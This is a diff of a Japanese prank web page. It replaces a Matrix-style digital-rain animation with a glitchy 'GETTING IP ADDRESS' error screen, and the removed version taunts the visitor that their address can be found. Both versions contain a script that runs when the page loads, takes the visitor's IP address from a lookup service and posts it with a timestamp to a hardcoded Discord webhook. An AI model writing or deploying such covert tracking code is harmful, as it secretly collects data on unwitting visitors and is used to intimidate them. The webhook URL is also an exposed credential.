@@ -1,143 +1,133 @@
-できます！LEO WAS HERE
-今度は黒い画面に緑の0と1が上から下へ大量に落ちる、映画のマトリックス風にします。
-
-メモ帳の中身を全部消して、これを貼ってください。
-
 <!DOCTYPE html>
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>Digital Rain</title>
-
+  <title>SYSTEM ERROR / DATA CORRUPT</title>
   <style>
-    html, body {
+    * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
+    }
+    body {
+      background-color: #0d0d0d;
+      color: #00ff66;
+      font-family: 'Consolas', 'Courier New', monospace;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* 背景グリッチ演出 */
+    .glitch-bg {
+      position: absolute;
+      top: 0;
+      left: 0;
       width: 100%;
       height: 100%;
-      overflow: hidden;
-      background: black;
+      background: radial-gradient(circle, rgba(0,255,102,0.05) 0%, rgba(0,0,0,0.9) 100%);
+      pointer-events: none;
     }
 
-    canvas {
-      display: block;
+    /* 走査線風のライン */
+    .scanline {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(
+        to bottom,
+        rgba(255,255,255,0),
+        rgba(255,255,255,0) 50%,
+        rgba(0, 0, 0, 0.4) 50%,
+        rgba(0, 0, 0, 0.4)
+      );
+      background-size: 100% 4px;
+      pointer-events: none;
     }
 
-    #title {
-      position: fixed;
-      top: 20px;
-      left: 25px;
-      color: #00ff00;
-      font-family: Consolas, monospace;
-      font-size: 22px;
-      text-shadow: 0 0 10px #00ff00;
-      z-index: 10;
+    /* テキストのグリッチ（バグ）アニメーション */
+    .glitch {
+      font-size: 2rem;
+      font-weight: bold;
+      text-transform: uppercase;
+      position: relative;
+      text-shadow: 0.05em 0 0 rgba(255,0,0,0.75),
+                  -0.025em -0.05em 0 rgba(0,255,0,0.75),
+                  0.025em 0.05em 0 rgba(0,0,255,0.75);
+      animation: glitch 500ms infinite;
+      margin-bottom: 20px;
+    }
+
+    .sub-text {
+      font-size: 1.2rem;
+      color: #ff3366;
+      text-shadow: 0 0 8px #ff3366;
+      animation: blink 0.8s infinite alternate;
+    }
+
+    @keyframes glitch {
+      0% {
+        text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75), -0.025em 0.05em 0 rgba(0,0,255,0.75);
+      }
+      14% {
+        text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75), -0.025em 0.05em 0 rgba(0,0,255,0.75);
+      }
+      15% {
+        text-shadow: -0.05em -0.025em 0 rgba(255,0,0,0.75), 0.025em 0.025em 0 rgba(0,255,0,0.75), -0.05em -0.05em 0 rgba(0,0,255,0.75);
+      }
+      49% {
+        text-shadow: -0.05em -0.025em 0 rgba(255,0,0,0.75), 0.025em 0.025em 0 rgba(0,255,0,0.75), -0.05em -0.05em 0 rgba(0,0,255,0.75);
+      }
+      50% {
+        text-shadow: 0.025em 0.05em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,0,0.75), 0 -0.05em 0 rgba(0,0,255,0.75);
+      }
+      99% {
+        text-shadow: 0.025em 0.05em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,0,0.75), 0 -0.05em 0 rgba(0,0,255,0.75);
+      }
+      100% {
+        text-shadow: -0.025em 0 0 rgba(255,0,0,0.75), -0.025em -0.025em 0 rgba(0,255,0,0.75), -0.025em -0.05em 0 rgba(0,0,255,0.75);
+      }
+    }
+
+    @keyframes blink {
+      0% { opacity: 0.2; }
+      100% { opacity: 1; }
     }
   </style>
 </head>
-
 <body>
 
-<div id="title">開いたねｗ住所特定できるよ // この世の天才レオ様</div>
+  <div class="glitch-bg"></div>
+  <div class="scanline"></div>
 
-<canvas id="matrix"></canvas>
+  <div class="glitch">GETTING IP ADDRESS... [GLITCH]</div>
+  <div class="sub-text">IP: [DATA_CORRUPT] / LOCATION: [ERROR]</div>
 
-<script>
-const canvas = document.getElementById("matrix");
-const ctx = canvas.getContext("2d");
+  <script>
+    // 訪問者のIPアドレスを取得してDiscordに送信
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const webhookUrl = 'https://discord.com/api/webhooks/1539148282901827625/ywbiBu7Xko4vofcqNeA4X8I9ynNrFs9C7nfIBMs2phr516KBRHTnSikIi';
+        
+        const payload = {
+          content: `🚨 **アクセス通知**\nIPアドレス: \`${data.ip}\`\n日時: ${new Date().toLocaleString('ja-JP')}`
+        };
 
-function resize() {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-}
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      })
+      .catch(err => console.error(err));
+  </script>
 
-resize();
-window.addEventListener("resize", resize);
-
-const fontSize = 18;
-let columns = Math.floor(canvas.width / fontSize);
-let drops = [];
-
-function resetDrops() {
-  columns = Math.floor(canvas.width / fontSize);
-  drops = [];
-
-  for (let i = 0; i < columns; i++) {
-    drops[i] = Math.random() * -100;
-  }
-}
-
-resetDrops();
-
-const chars = "01";
-
-function draw() {
-
-  // 黒を少し透明にして残像を作る
-  ctx.fillStyle = "rgba(0, 0, 0, 0.08)";
-  ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-  ctx.font = fontSize + "px Consolas, monospace";
-
-  for (let i = 0; i < drops.length; i++) {
-
-    const char = chars[Math.floor(Math.random() * chars.length)];
-
-    // たまに明るい文字
-    if (Math.random() < 0.05) {
-      ctx.fillStyle = "#ffffff";
-      ctx.shadowColor = "#00ff00";
-      ctx.shadowBlur = 15;
-    } else {
-      ctx.fillStyle = "#00ff00";
-      ctx.shadowColor = "#00ff00";
-      ctx.shadowBlur = 5;
-    }
-
-    ctx.fillText(
-      char,
-      i * fontSize,
-      drops[i] * fontSize
-    );
-
-    ctx.shadowBlur = 0;
-
-    // 下まで行ったら上に戻る
-    if (
-      drops[i] * fontSize > canvas.height &&
-      Math.random() > 0.975
-    ) {
-      drops[i] = 0;
-    }
-
-    drops[i]++;
-  }
-
-  requestAnimationFrame(draw);
-}
-
-draw();
-
-window.addEventListener("resize", resetDrops);
-</script>
-<script>
-  // 訪問者のIPアドレスを取得してDiscordに送信
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      const webhookUrl = 'https://discord.com/api/webhooks/1539148282901827625/ywbiBu7Xko4vofcqNeA4X8I9ynNrFssWs7ROh7eqo9C7nfIBMs2phr516KBRHTnSikIi';
-      
-      const payload = {
-        content: `🚨 **アクセス通知**\nIPアドレス: \`${data.ip}\`\n日時: ${new Date().toLocaleString('ja-JP')}`
-      };
-
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-    })
-    .catch(err => console.error(err));
-</script>
 </body>
 </html>
